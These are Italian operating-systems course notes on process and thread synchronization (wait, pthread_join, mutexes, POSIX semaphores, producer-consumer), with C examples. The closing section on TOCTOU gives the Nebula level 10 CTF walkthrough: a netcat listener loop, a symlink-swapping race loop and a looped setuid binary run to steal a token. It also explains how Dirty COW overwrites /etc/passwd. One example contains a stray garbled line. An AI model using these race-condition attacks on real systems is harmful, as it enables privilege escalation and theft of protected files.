# Sincronizzazione
## Scenario
- Le applicazioni moderne sono spesso distribuite, ci sono molteplici componenti che comunicano tra di loro.
	- In un contesto distribuito è fondamentale coordinare l'esecuzione degli asset verso un obiettivo ben preciso
- Quali strumenti ci mette a disposizione l'os?
	- **Sincronizzazione di un processo (thread)**: è l'atto di processo o thread di bloccare la propria esecuzione nell'attesa di un evento
		- Una volta che l'evento è verificato allora riprende la propria esecuzione
	- Esempi tipici:
		- **cambio di stato** di un altro processo/thread
		- rilascio di una risorsa da parte di un altro processo (accesso a **mutua esclusione**)
		- **condizione logica** definita ad hoc dal programmatore
### Sync - Cambio di Stato
- **wait()**: chiamata di sistema che blocca il processo invocante fino a quando uno dei suoi figli non cambia stato.
	- **Cambio di stato**: È uno degli eventi seguenti
		- Un processo figlio esce normalmente o con errore
		- Un processo figlio esce per via di un segnale
		- Un processo figlio è stoppato o ripristinato da un segnale
	- Noi ci concentriamo sul primo caso
#### Esempio wait.c
```c
/*
 * wait.c - sincronizzazione con i processi figli 
 *
 * Si illustra il funzionamento della chiamata
 * di sistema wait(), che consente al processo
 * padre di attendere il termine dell'esecuzione
 * di un processo figlio.
 */

#include <stdio.h>	/* perror() */
#include <stdlib.h>	/* exit() */
#include <unistd.h>	/* fork(), getpid(), sleep() */
#include <sys/wait.h>   /* wait() */

#define	SLEEPINTVL	5

int main (void)
{
	pid_t pid, child_pid;

	/* Il padre genera un processo figlio */
	if ((pid = fork()) < 0) {
		perror("fork()");
		exit(EXIT_FAILURE);
	}

	if (pid > 0) {
		/* Processo padre: si attende l'uscita del figlio */
		printf("Processo padre: attendo il figlio.\n");

		/*
		 * In questi primi esempi non interessa indagare sui
		 * motivi del cambio di stato. Pertanto, si può
		 * passare NULL come argomento a wait().
		 */
		if ((child_pid = wait(NULL)) == -1) {

			perror("wait()");
			exit(EXIT_FAILURE);
		} else
			/* Si stampa il PID del processo figlio uscito */
			printf("Processo padre: il figlio con PID %d è uscito.\n", child_pid);
	} else if (pid == 0) {
		/* Processo figlio: dorme per alcuni secondi ed esce. */		
		printf("Processo figlio: ho PID %d e aspetto %d secondi.\n",
			getpid(), SLEEPINTVL);
		sleep(SLEEPINTVL);
		printf("Processo figlio: esco.\n");
	}

	exit(EXIT_SUCCESS);
}
```

- Nel programma un processo
	- genera un figlio 
	- aspetta il termine del'esecuzione del figlio con wait()
	- stampa un messaggio ed esce
#### sync - cambio stato (thread)
- **pthread_join()**: è l'analogo per i thread della funzione wait() per i processi.
	- Sospende l'esecuzione del thread invocante fino a che un determinato thread termina
##### Esempio - pthread_join.c
```c
/*
 * pthread_join.c - attesa di un thread
 *
 * Si illustra il funzionamento della funzione
 * di libreria pthread_join(), che consente di
 * attendere il termine dell'esecuzione di un
 * thread.
 * Un processo padre crea due thread che stampano
 * una stringa (passata come argomento) e ritornano
 * la lunghezza della stessa. Successivamente, il
 * processo padre attende i due thread e stampa il
 * loro valore di ritorno.
 */

#include <stdio.h>	/* perror() */
#include <stdlib.h>	/* exit(), malloc(), free() */
#include <pthread.h>	/* pthread_create(), pthread_join() */
#include <unistd.h>	/* sleep() */
#include <string.h>	/* strlen() */

void *print_message(void *arg) {

	char *s = (char *)arg;

	printf("%s", s);
edulazione di
	return (void *)strlen(s);
}

int main(void) {

	pthread_t t1, t2;
	void *res_t1, *res_t2;
	int s;

	/* Il processo crea due thread. */
	s = pthread_create(&t1, NULL, print_message, (void *)"Hello from thread 1!\n"); 
	if (s != 0) {
		perror("pthread_create(&t1, ...)");
		exit(EXIT_FAILURE);
	}
	s = pthread_create(&t2, NULL, print_message, (void *)"Ciao da thread 2!\n");
	if (s != 0) {
		perror("pthread_create(&t2, ...)");
		exit(EXIT_FAILURE);
	}

	/* Il processo attende i due thread. */
	s = pthread_join(t1, &res_t1);
	if (s != 0) {
		perror("pthread_join(t1, ...)");
		exit(EXIT_FAILURE);
	}
	s = pthread_join(t2, &res_t2);
	if (s != 0) {
		perror("pthread_join(t2, ...)");
		exit(EXIT_FAILURE);
	}

	/* Qui i due thread sono già terminati. */
	printf("Valore di ritorno di thread 1: %ld\n", (long) res_t1);
	printf("Valore di ritorno di thread 2: %ld\n", (long) res_t2);

	exit(EXIT_SUCCESS);
}
```
- In questo caso abbiamo un processo che crea 2 thread
	- Ogni thread stampa una stringa 
	- Ritornano il valore della stringa stampata
- Il processo padre attende che i thread abbiano finito e stampa il loro valore
## Corsa Critica
- L'ordine di schedulazione di processi e thread impatta sulla correttezza del risultato delle operazioni su un asset condiviso 
- Quando il valore finale di un elaborazione su un asset **condiviso** dipende dall'ordine di esecuzione delle istruzioni che la modificano si è in presenza di **corsa critica**(race condition).
### Sezione Critica
- Siano dati n task (processi o thread)
	- Eseguiti concorrentemente
	- cooperanti tramite dati condivisi
- Ciascun task ha una porzione di codice che accede ai dati condivisi
	- Tale porzione di codice prende il nome di **sezione critica**
	- La sezione critica può essere eseguita da al più un processo/thread alla volta
### Approcci al problema
- Per evitare le corse critiche è necessario che solo un task alla volta esegua quella porzione di codice. Esistono due approcci
	- **Accesso in mutua esclusione**
		- Si bloccano tutti i tentativi di accesso alla variabile condivisa se quest'ultima è già in uso
	- **Esecuzione atomica**
		- Si fa in modo che il codice macchina relativo alla modifica della variabile condivisa sia eseguito integramente e se non fosse possibile allora non venga eseguito
### Protezioni sezioni critiche
- La sincronizzazione degli accessi in mutua esclusione avviene tramite un protocollo di sincronizzazione
	- **Sezione di ingresso**: il task chiede il permesso di entrare nella sezione critica
	- **Sezione critica**: accesso ai dati condivisi
	- **Sezione di uscita**: rilascio dell'uso della sezione critica
	- **Sezione non critica**: codice la cui esecuzione non richiede un meccanismo di mutua esclusione
#### Supporto HW
- Nei moderni SO le sezioni di ingresso e di uscita sono implementate tramite un modello universale: **lock**
- La protezione della sezione critica avviene con
	- variabile intera **lock**: indica se la risorsa è libera o meno
	- meccanismo che controlla lo stato della variabile e permette l'accesso esclusivo
#### Modello di locking/unlocking
Il meccanismo generale di locking si presenta nel seguente modo
```c
do{
	<acquisizione lock>
	<sezione critica>
	<rilascio lock>
	<sezione non critica>
}while(true)
```
### Semaforo
- **Semaforo**: variabile intera S che conta il numero di istanze di una risorsa condivisa ancora disponibili agli utenti
	- La variabile S può essere acceduta solo tramite 3 funzioni
		- **init(S)**: inizializza S ad un valore > 0
		- **wait(S)**: sezione di accesso
		- **signal(S)**: sezione di uscita 
#### Locking/Unlocking con i semafori
- Il protocollo di sincronizzazione con i semafori è il seguente
```c
init(S);
do{
	wait(S);
	<sezione critica>
	signal(S);
}while(true);
```
#### Semafori contatori e binari
- **Semaforo contatore**: S è inizializzata ad un valore > 1
	- Rappresenta una risorsa con molteplici istanze
- **Semafori binari**: 
	- S è inizializzata ad 1 (caso comune)
	- La risorsa è presente in singola istanza, o la si usa oppure non la si usa
	- Viene anche detto **mutex** Mutual Exclusion
#### Attesa Attiva
- L'implementazione appena vista è ad **attesa attiva**, cioè l'attesa implementata nella wait è di tipo **busy waiting**
	- Un ciclo while che esegue fino a quando non si verifica una determinata condizione
- Un semaforo attivo prende il nome di **spinlock**
#### Attesa Passiva
- Nell'implementazione ad **attesa passiva** il processo viene messo in attesa (sleep) che si verifichi l'evento che consente l'accesso alla sezione critica.
	- Quando tale evento accade allora il processo viene risvegliato
#### Attivo vs Passivo
##### Quando si usa lo spinlock?
- Attese brevi (~ns)
- È disastroso per attese più lunghe
	- L'attesa brucia il processore che non va mai in idle
	- L'attesa non permette agli altri processi di avanzare
##### Quando si utilizza il semaforo passivo?
- Ideale per attese lunghe
	- Si blocca un processo che altrimenti impallerebbe la macchina
- Disastroso per attese brevi
	- La sospensione e ripristino di un processo introducono un ritardo inaccettabile
#### Mutex in GNU/Linux
- La libreria pthreads definisce il tipo di dato opaco **pthread_mutex_t** per la rappresentazione del semaforo binario.
- È possibile configurare particolari proprietà tramite **pthread_mutexattr_t**
	- mutex normale
	- ricorsivo
	- controllo degli errori
	- ...
- Nel nostro caso vedremo solo mutex normali quindi non sarà necessario impostare altre proprietà
##### Inizializzazione Mutex
- funzione di libreria che inizializza i mutex **pthread_mutex_init**()
	- input
		- puntatore ad una struttura di tipo pthread_mutex_t
		- puntatore ad una struttura di tipo pthread_mutexattr_t
			- rappresenta gli attributi del mutex (NULL per quelli di default)
	- output
		- sempre 0
##### Accesso in mutua esclusione
- **pthread_mutex_lock**(): funzione che ottiene l'accesso in mutua esclusione alla risorsa protetta
- input
	- puntatore ad una struttura di tipo pthread_mutex_t
- output
	- in caso di successo: 0
	- in caso di errore: codice di errore(numero positivo)
- Per altri dettagli: man 3 pthread_mutex_lock
##### Rilascio della risorsa
- La funzione **pthread_mutex_unlock**() rilascia il lock su una risorsa condivisa protetta da un pthread_mutex_t
- input
	- puntatore ad una struttura pthread_mutex_t
- output
	- in caso di successo: 0
	- in caso di errore: codice dell'errore(numero positivo)
#### Esempio pthread_mutex.c
```c
/*
 * pthread_mutex.c - accesso in mutua esclusione
 *		     ad un'area di memoria condivisa
 *
 * Si illustra il funzionamento delle funzioni di
 * libreria pthread_mutex_{create,destroy,lock,unlock}(),
 * che consentono di impostare l'accesso in mutua
 * esclusione ad un'area di memoria condivisa.
 */

#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>

#define NTHREADS 2

/* Variabili globali (condivise tra i thread) */
pthread_mutex_t lock;
int variabile_contesa = 0;

void *do_work (void *thread_num)
{
	int *my_num = (int *)thread_num;
	printf("[%d] inizio funzione specifica\n", *my_num);

	printf("[%d] il contenuto della variabile è %d\n",
		*my_num, variabile_contesa);

	printf("[%d] acquisizione lock\n", *my_num);
	if (pthread_mutex_lock(&lock) != 0) {
		perror("pthread_mutex_lock()");
		pthread_exit(NULL);
	}

	variabile_contesa++;

	printf("[%d] rilascio lock\n", *my_num);
	if (pthread_mutex_unlock(&lock) != 0) {
		perror("pthread_mutex_unlock()");
		pthread_exit(NULL);
	}

	printf("[%d] dopo la modifica, il contenuto della variabile è %d\n",
		*my_num, variabile_contesa);

	pthread_exit(NULL);
}

int main (void)
{
	int i;
	pthread_t threads[NTHREADS];
	/*
	 * Utilizziamo la variabile args per mantenere il numero
	 * del thread creato e differenziare le tracce di
	 * esecuzione. Il thread creato per primo riceverà, come
	 * argomento, il contenuto di args[0], quindi il numero "0",
	 * appunto. Similmente, il thread creato per secondo
	 * riceverà, come argomento, il contenuto di args[1], quindi
	 * il numero "1".
	 */
	int args[NTHREADS] = { 0, 1 };

	/* Inizializzazione del mutex */
	pthread_mutex_init(&lock, NULL);

	/* Creazione dei thread, che eseguono la medesima funzione */
	for (i = 0; i < NTHREADS; i++) {
		if (pthread_create(&threads[i], NULL, &do_work, &args[i]) != 0) {
			perror("pthread_create()");
			exit(EXIT_FAILURE);
		}
	}

	/* La traccia di esecuzione principale attende i due thread */
	for (i = 0; i < NTHREADS; i++) {
		if (pthread_join(threads[i], NULL) != 0) {
			perror("pthread_join()");
			exit(EXIT_FAILURE);
		}
	}

	if (pthread_mutex_destroy(&lock) != 0) {
		pthread_mutex_unlock(&lock);
		perror("pthread_mutex_destroy()");
		exit(EXIT_FAILURE);
	}

	exit(EXIT_SUCCESS);
}
```
#### Limitazione dei mutex
- Nell'esempio visto prima siamo solo in grado di segnalare **il rilascio di una risorsa**
- Con un mutex (semaforo contatore binario) non siamo in grado di segnalare una generica condizione ad altri task
- Serve un meccanismo più generale di attesa e segnalazione di eventi
#### Produttore - Consumatore
- Un processo padre crea N thread produttori ed M thread consumatori (N,M > 1)
- Il thread produttore produce elementi e li inserisce in un array
	- se l'array è pieno allora si blocca
- Il thread consumatore estrae elementi dall'array e li consuma
	- se l'array è vuoto allora si blocca
- L'array è condiviso tra produttori e consumatori
##### Esempio 
- Produttore e consumatore possono essere funzioni banali, non sono loro il focus dell'esercizio
- **Produttore**: generazione continua di un intero
- **Consumatore**: stampa continua di un intero
- Il focus è sulle tecniche di sincronizzazione fra thread
- Un semplice mutex ci può garantire solamente la mutua esclusione che non è ciò che vogliamo in questo momento.
	- Se si potessero rappresentare i due eventi
		- si è liberato un elemento dell'array
			- Il **produttore** attende questo evento
			- inserisce in mutua esclusione l'elemento nell'array
			- segnala l'evento array pieno
		- si è riempito un elemento dell'array
			- Il **consumatore** attende questo evento
			- Estrae in mutua esclusione l'elemento dall'array
			- Segnala l'evento "elemento array vuoto"
#### Semafori contatore in GNU/Linux
- Nella libreria pthreads non c'è alcun supporto per i semafori contatore
- Bisogna ricorrere alla libreria del C
	- POSIX
	- SysV
- Noi vedremo i semafori di tipo **POSIX** (per questione di semplicità)
#### Semafori POSIX
- **named**: un semaforo con nome è associato ad una stringa ed è facilmente visibile tra processi e thread distinti
- **unamed**: Un semaforo senza nome non ha associato alcuna stringa ed è facilmente visibile solo fra thread di uno stesso processo.
	- Noi lavoreremo con questi
##### Senza nome
- La libreria del C definisce il tipo di dato opaco **sem_t** per rappresentare un semaforo
	- <semaphore.h>
- **sem_init()**: funzione di libreria che inizializza i semafori
	- input
		- puntatore ad una struttura di tipo **sem_t**
		- flag che indica se il semaforo è condiviso tra thread (0) o processi (!= 0)
		- valore iniziale del semaforo (> 1 per un semaforo contatore)
	- output
		- in caso di successo: 0
		- in caso di errore: -1 (il codice di errore è **errno**)
- **sem_wait()**: implementa la logica di attesa dei semafori
	- decrementa il valore del semaforo
	- Se count > 0, ritorna senza bloccarsi
	- Se count = 0, si blocca in attesa che il contatore > 0
	- input
		- puntatore ad una struttura **sem_t**
	- output
		- in caso di successo: 0
		- in caso di errore: -1
- **sem_post()**: implementa la logica di sblocco dei semafori
	- incrementa il contatore del semaforo
	- Se contatore > 0, si risveglia un task in attesa sul semaforo
	- input
		- puntatore alla struttura
	- output 
		- in caso di successo: 0
		- in caso di errore: -1
- **sem_destroy()**: distrugge un semaforo precedentemente inizializzato
	- input
		- puntatore a struttura
	- output 
		- in caso di successo: 0
		- in caso di errore: -1
##### Integrazione semafori contatore (produttore - consumatore)
- SI definiscono 2 nuovi semafori
	- **full**: conta le istanze della risorsa "elementi pieni nell'array"
	- **empty**: conta le istanze della risorsa "elementi liberi nell'array"
- Si modificano le procedure di lock/unlock in modo tale da
	- garantire mutua esclusione negli accessi alle variabili condivise
	- garantire alternanza fra produttori e consumatori

```c
/*
 * producer_consumer_sem.c - soluzione del problema produttore-consumatore
 *                             mediante mutex
 *
 * Un processo padre definisce NUM_PRODUCERS thread produttori
 * e NUM_CONSUMERS thread consumatori.
 * - Un thread produttore genera un numero casuale e lo
 *   inserisce in mutua esclusione in un array circolare.
 * - Un thread consumatore estrae un numero dall'array
 *   in mutua esclusione e lo consuma, stampandolo.
 */
#include <pthread.h>	/* pthread_* */
#include <semaphore.h>	/* sem_* */
#include <stdio.h>	/* printf() */
#include <stdlib.h>	/* exit(), srand(), rand() */
#include <time.h>	/* time */

#define NUM_ELEMENTS 	5
#define NUM_PRODUCERS	10
#define NUM_CONSUMERS	10

/* l'array condiviso */
int elements[NUM_ELEMENTS];

/* puntatore alla prima cella libera */
int in = 0;

/* puntatore alla prima cella occupata */
int out = 0;

/*
 * Numero di elementi nell'array
 * counter = 0: array vuoto
 * counter = NUM_ELEMENTS: array pieno
 */
int counter = 0;

/* mutex proteggente le variabili condivise */
pthread_mutex_t lock;

/* 
 * semafori di sincronizzazione
 * - full: numero di elementi pieni nell'array
 * - empty: numero di elementi vuoti nell'array
 */
sem_t full, empty;

/* produttore */
void *producer(void *arg) {

	int thread_num = *((int *)arg);
	int elem;

	while(1) {

		/* produzione di un elemento */
		elem = rand();
		printf("P%d: produced %d\n", thread_num, elem);

		/*
		 * Attesa dello svuotamento di almeno un
		 * elemento dell'array. A differenza di
		 * prima, ora l'attesa è passiva.
		 */
		if (sem_wait(&empty) != 0) {
			perror("sem_wait()");
			exit(EXIT_FAILURE);
		}
		/*
		 * Richiesta accesso in mutua esclusione
		 * alle strutture dati condivise
		 * dell'elemento nell'array
		 */
		if (pthread_mutex_lock(&lock) != 0) {
			perror("pthread_mutex_lock()");
			exit(EXIT_FAILURE);
		}

		/* Inserimento dell'elemento nell'array */
		elements[in] = elem;

		/* Aggiornamento dei contatori */
		in = (in + 1) % NUM_ELEMENTS;
		counter++;

		/* Rilascio del lock */
		if (pthread_mutex_unlock(&lock) != 0) {
			perror("pthread_mutex_unlock()");
			pthread_exit(NULL);
		}

		/*
		 * Segnalazione del riempimento di
		 * un elemento dell'array. Ciò
		 * risveglia un consumer.
		 */
		if (sem_post(&full) != 0) {
			perror("sem_post()");
			exit(EXIT_FAILURE);
		}
	}
}

/* consumatore */
void *consumer(void *arg) {

	int thread_num = *((int *)arg);
	int elem;

	while(1) {

		/*
		 * Attesa del riempimento di almeno un
		 * elemento dell'array. A differenza di
		 * prima, ora l'attesa è passiva.
		 */
		if (sem_wait(&full) != 0) {
			perror("sem_wait()");
			exit(EXIT_FAILURE);
		}
		/*
		 * Richiesta accesso in mutua esclusione
		 * alle strutture dati condivise
		 * dell'elemento nell'array
		 */
		if (pthread_mutex_lock(&lock) != 0) {
			perror("pthread_mutex_lock()");
			pthread_exit(NULL);
		}

		/* Recupero dell'elemento dall'array */
		elem = elements[out];

		/* Aggiornamento dei contatori */
		out = (out + 1) % NUM_ELEMENTS;
		counter--;

		/* Rilascio del lock */
		if (pthread_mutex_unlock(&lock) != 0) {
			perror("pthread_mutex_unlock()");
			pthread_exit(NULL);
		}

		/*
		 * Segnalazione dello svuotamento di
		 * un elemento dell'array. Ciò
		 * risveglia un producer.
		 */
		if (sem_post(&empty) != 0) {
			perror("sem_post()");
			exit(EXIT_FAILURE);
		}

		/* consumo dell'elemento */
		printf("C%d: consumed %d\n", thread_num, elem);
	}
}

int main(void) {

	pthread_t producers[NUM_PRODUCERS];
	pthread_t consumers[NUM_CONSUMERS];
	int i;

	/* inizializzazione del generatore di numeri casuali */
	srand(time(0));

	/* Inizializzazione del mutex */
	pthread_mutex_init(&lock, NULL);

	/*
	 * Inizializzazione dei semafori
	 * - empty = NUM_ELEMENTS 
	 * - full = 0
	 */
	if (sem_init(&empty, 0, NUM_ELEMENTS) != 0) {
		perror("sem_init()");
		exit(EXIT_FAILURE);
	}
	if (sem_init(&full, 0, 0) != 0) {
		perror("sem_init()");
		exit(EXIT_FAILURE);
	}

	/* Creazione dei thread produttori */
	for (i = 0; i < NUM_PRODUCERS; i++) {
		if (pthread_create(&producers[i], NULL, &producer, (void *)&i) != 0) {
			perror("pthread_create()");
			exit(EXIT_FAILURE);
		}
	}

	/* Creazione dei thread consumatori */
	for (i = 0; i < NUM_CONSUMERS; i++) {
		if (pthread_create(&consumers[i], NULL, &consumer, (void *)&i) != 0) {
			perror("pthread_create()");
			exit(EXIT_FAILURE);
		}
	}

	/* Join dei thread */
	for (i = 0; i < NUM_PRODUCERS; i++) {
		if (pthread_join(producers[i], (void **)0) != 0) {
			perror("pthread_join()");
			exit(EXIT_FAILURE);
		}
	}
	for (i = 0; i < NUM_CONSUMERS; i++) {
		if (pthread_join(consumers[i], (void **)0) != 0) {
			perror("pthread_join()");
			exit(EXIT_FAILURE);
		}
	}

	pthread_exit(NULL);
}

```
## Misusi della sincronizzazione
- Il programmatore medio commette errori madornali nell'ambito della sincronizzazione
	- non la usa
	- sincronizza tramite temporizzazioni
	- controllo/utilizzo di un asset a distanza di tempo elevata
### Debolezza
- L'attaccante prova ad individuare difetti nel meccanismo di sincronizzazione di un asset e a sfruttarli
- **TOCTOU**: si fa riferimento a time of check to time of use
	- L'attaccante cerca frammenti di codice così fatti
```c
if(asset accessibile){
	statement
	statement
	statement
	utilizzo assett
}
```
- Il problema è che passa troppo tempo tra il check dell'asset e il suo utilizzo, tempo che può essere sfruttato per portare un attacco
### Conseguenze dell'attacco
- L’erroneo uso della sincronizzazione nel’ambito di asset cooperanti porta alla esecuzione non deterministica di una applicazione
	- Dipende tutto dallo scheduler della CPU
### Nebula - Level 10
```c
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdio.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>

int main(int argc, char **argv)
{
  char *file;
  char *host;

  if(argc < 3) {
      printf("%s file host\n\tsends file to host if you have access to it\n", argv[0]);
      exit(1);
  }

  file = argv[1];
  host = argv[2];

  if(access(argv[1], R_OK) == 0) { // access utilizza le credenziali reali non quelle effettive
      int fd;
      int ffd;
      int rc;
      struct sockaddr_in sin;
      char buffer[4096];

      printf("Connecting to %s:18211 .. ", host); fflush(stdout);

      fd = socket(AF_INET, SOCK_STREAM, 0);

      memset(&sin, 0, sizeof(struct sockaddr_in));
      sin.sin_family = AF_INET;
      sin.sin_addr.s_addr = inet_addr(host);
      sin.sin_port = htons(18211);

      if(connect(fd, (void *)&sin, sizeof(struct sockaddr_in)) == -1) {
          printf("Unable to connect to host %s\n", host);
          exit(EXIT_FAILURE);
      }

#define HITHERE ".oO Oo.\n"
      if(write(fd, HITHERE, strlen(HITHERE)) == -1) {
          printf("Unable to write banner to host %s\n", host);
          exit(EXIT_FAILURE);
      }
#undef HITHERE

      printf("Connected!\nSending file .. "); fflush(stdout);

      ffd = open(file, O_RDONLY);
      if(ffd == -1) {
          printf("Damn. Unable to open file\n");
          exit(EXIT_FAILURE);
      }

      rc = read(ffd, buffer, sizeof(buffer));
      if(rc == -1) {
          printf("Unable to read from file: %s\n", strerror(errno));
          exit(EXIT_FAILURE);
      }

      write(fd, buffer, rc);

      printf("wrote file!\n");

  } else {
      printf("You don't have access to %s\n", file);
  }
}
```
- Verifico l'accesso ad un file passato al programma tramite argomento
	- access usa le credenziali reali e non quelle effettive (il binario ha setuid)
- Prima dell'apertura del file ho tutta la parte di connessione del socket che ci permettono di operare con calma
- Apro il file e lo invio
- Il pattern TOCTOU è evidente
- Svolgimento
	- prima di tutto creo un server TCP in ascolto localmente sulla porta 18211 con cui il socket può comunicare
		- utilizzo netcat per farlo il punto è che dopo una singola richiesta  netcat esce, bisogna inserire il tutto in un loop infnito 
		- while :; do nc.traditional -vlp 18211 >> /tmp/server.txt; done
			- da guardare cos'è quel traditional
			- v: verbose
			- l: modalità ascolto
			- p: porta sul quale ascoltare
			- il tutto viene messo in coda al file /tmp/server.txt
	- A questo punto quello che devo fare è trovare un modo di "ingannare" il mio programma passandogli un file per cui ho accesso e poi sostituirlo con il token
			- Per farlo creo un ulteriore loop in cui quello che vado a fare è creare dei link simbolici ad un file fittizio
				- Prima cosa creo un file /tmp/token (vuoto) per cui io ho i permessi
				- Successivamente devo riuscire velocemente a far si che il mio /tmp/token e il toke vero puntino ad uno stesso file simbolico
					- Quando il mio programma leggera il link simbolico controllerà l'accesso per il /tmp/token (io ho i permessi)
					- Mentre quando il programma dovrà aprire e inviare il file il link punterà al token originale (il programma esegue con setuid può farci quello che vuole)
					- while :; do ln -fs /tmp/token /tmp/link; ln -fs /home/flag10/toke /tmp/link; done
						- Questo mi crea in loop i miei link simbolici, devo solo essere fortunato in modo tale che l'ordine coincida con quello che voglio
			- In fine eseguo in loop il mio binario dandogli come file il link simbolico /tmp/link e devo sperare di essere fortunato
				- Per aiutare la fortuna posso usare il comando **nice** per abbassare la priorità del mio processo e schedularlo il più tardi possibile (avendo più tempo per far si che il cambio avvenga)
				- while :; nice -n 19 /home/flag10/flag10 /tmp/link 127.0.0.1; done
			- Il gioco è fatto
### Dirty C0w
- La RAM fisica a disposizione di un calcolatore è accessibile tramite indirizzi fisici. L’insieme di tutti gli indirizzi fisici prende il nome di spazio degli indirizzi fisico. Lo spazio degli indirizzi fisico è unico e condiviso tra kernel e processi in esecuzione sulla macchina. Ciò comporta diverse problematiche, fra cui:
	- frammentazione della memoria
	- non isolamento dei processi
- Per ovviare a questi problemi gli OS moderni fanno uso di **memoria virtuale**
	- isolati
	- ogni processo ha un proprio layout di memoria
- **Paginazione**
	- la memoria fisica è suddivisa in unità di 4KB chiamati **frame**
	- la memoria virtuale viene spezzata in unità di 4KB chiamate **pagine**
		- Una pagina viene fatta corrispondere ad un frame
		- un frame può essere condiviso con più pagine
	- La gestione dell'associazione tra pagine e frame è gestita simultaneamente da HW e kernel
		- **HW:** Memory Management Unit (MMU) e Translation Lookaside Buffer (TLB)
		- **Kernel**: gestione della tabella delle pagine
	- L'isolamento avviene con tabelle delle pagine distinte per distinti processi ma la memoria fisica è condivisa
- **COW**
	- Quando un processo crea un figlio tramite fork(), il SO non alloca subito tutta la memoria al figlio. Per motivi di efficienza, il SO fa puntare la memoria del processo figlio a quella del processo padre
		- Quando uno tra padre e figlio vuole modificare una pagina scrivibile, il SO genera una copia privata della pagina (**copy on write, COW**)
- **Mappature**
	- **mmap()** è una chiamata di sistema che permette di creare mappe di memoria nello spazio degli indirizzi virtuali di un processo.
		- Una mappa di memoria è una regione contigua di indirizzi virtuali
		- **mappa anonima**:Le singole pagine saranno assegnate a frame fisici al primo accesso
		- **mappa su file:** Le singole pagine sono associate ai blocchi di un file. Al primo accesso alla pagina, il blocco di file corrispondente viene caricato in memoria 
	- **madvise()**: chiamata di sistema che permette  di dare al SO suggerimenti sull'utilizzo di una specifica regione di memoria virtuale cercando di ottimizzare l'accesso a tale regione
		- in presenza di pagine marcate con **MADV_DONTNEED**, soggette a COW con un altro processo
			- il sistema operativo procede immediatamente con la distruzione delle stesse, effettuando le scritture sullo spazio degli indirizzi dell’altro processo.
- **Exploit**
	- L’exploit crea tramite mmap() una mappatura privata di un file read-only.
		- Nell’exploit si usa il file /etc/passwd,che sarà sovrascritto per inserire un nuovo utente privilegiato con le credenziali seguenti
			- user: firefart
			- pass: decisa dall'utente
		- L’exploit procede con il tentativo di scrittura di dati opportuni negli indirizzi di memoria virtuale associati alla mappatura privata. A tal scopo si usa la chiamata di sistema write()
			- **write**: soffre di corsa critica, le azioni svolte da write sono 2 e non atomiche
				- Localizzazione di un indirizzo fisico su cui scrivere
				- Scrittura dei valori a partire dall’indirizzo fisico trovato
		- L’attaccante è in grado di “infilarsi” tra 1. e 2., svolgendo una operazione letale che consente, alla fine, di scrivere sul file /etc/passwd
		- **madvise(MADV_DONTNEED)**: Tale operazione provoca lo scarto delle pagine della mappatura privata, forzando il sistema operativo ad individuare come indirizzo fisico corrispondente alle pagine quello del file /etc/passwd!
	- https://www.cs.toronto.edu/~arnold/427/18s/427_18S/indepth/dirty-cow/demo.html


